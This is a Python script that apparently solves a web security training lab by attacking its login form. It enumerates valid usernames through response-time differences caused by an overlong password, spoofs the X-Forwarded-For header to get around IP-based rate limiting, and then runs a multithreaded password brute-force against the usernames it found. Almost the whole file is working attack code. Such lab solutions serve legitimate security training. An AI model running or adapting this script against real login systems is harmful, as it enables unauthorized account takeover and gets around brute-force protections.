import requests
from colorama import Fore, Style, init
import sys
from concurrent.futures import ThreadPoolExecutor
from threading import Lock


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        init()
        self.usernames_file = 'usernames.txt'
        self.passwords_file = 'passwords.txt'
        self.usernames = []
        self.passwords = []
        self.valid_usernames = []
        self.lock = Lock()

    def open_usernames_and_passwords_files(self):
        with open(self.usernames_file) as file:
            for username in file.readlines():
                username = username.strip()
                self.usernames.append(username)
        with open(self.passwords_file) as file:
            for password in file.readlines():
                password = password.strip()
                self.passwords.append(password)

    def check_username(self, username):
        data = {
            'username': username,
            'password': 'hacker'*100
        }
        headers = {
            'X-Forwarded-For': username+'-hacker'
        }
        response = self.session.post(self.lab_url + 'login', data=data, headers=headers)
        with self.lock:
            if response.elapsed.total_seconds() > 1:
                print(Fore.GREEN + '[+] ' + Style.RESET_ALL + username)
                self.valid_usernames.append(username)
            else:
                print(Fore.RED + '[-] ' + Style.RESET_ALL + username)

    def enumerate_usernames(self):
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(self.check_username, self.usernames)

    def check_password(self, username, password):
        data = {
            'username': username,
            'password': password
        }
        headers = {
            'X-Forwarded-For': password + '-hacker'
        }
        response = self.session.post(self.lab_url + 'login', data=data, headers=headers)
        with self.lock:
            if 'Invalid username or password.' not in response.text:
                print(Fore.GREEN + f'[+] {username}:{password}' + Style.RESET_ALL)
            else:
                print(Fore.RED + f'[-] {username}:{password}' + Style.RESET_ALL)

    def enumerate_passwords(self):
        for username in self.valid_usernames:
            with ThreadPoolExecutor(max_workers=10) as executor:
                executor.map(lambda password: self.check_password(username, password), self.passwords)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.open_usernames_and_passwords_files()
        self.enumerate_usernames()
        self.enumerate_passwords()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
